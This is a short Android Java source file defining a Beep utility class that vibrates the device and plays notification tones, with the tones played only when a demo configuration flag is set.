package com.android.dvci;

import java.io.IOException;
import java.util.concurrent.Semaphore;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.media.ToneGenerator;
import android.net.Uri;
import android.os.Vibrator;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;

public class Beep {
	private static final String TAG = "Beep";



	static public void playTone(int tone)
	{
		vibrate();
		AudioManager audioManager = (AudioManager)Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
		//audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 20, 0);
		audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, 20, 0);
		audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 20, 0);

		ToneGenerator tg = new ToneGenerator(AudioManager.STREAM_NOTIFICATION, ToneGenerator.MAX_VOLUME);
		tg.startTone(tone);
	}

	static public void vibrate(){
		try {
			Vibrator v = (Vibrator) Status.getAppContext().getSystemService(Context.VIBRATOR_SERVICE);
			v.vibrate(300);
		}catch(Exception ex){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (playSound), ERROR: " + ex);
			}
		}
	}

	public static void bip() {
		if (Cfg.DEMO) {
			playTone(ToneGenerator.TONE_CDMA_KEYPAD_VOLUME_KEY_LITE);
		}
	}

	public static void beep() {
		if (Cfg.DEMO) {
			playTone(ToneGenerator.TONE_PROP_BEEP);
		}
	}


	public static void beepPenta() {
		if (Cfg.DEMO) {

			playTone(ToneGenerator.TONE_PROP_BEEP2);
		}
	}
	
	public static void beepExit() {
		if (Cfg.DEMO) {
			playTone(ToneGenerator.TONE_PROP_PROMPT);
		}
	}
}
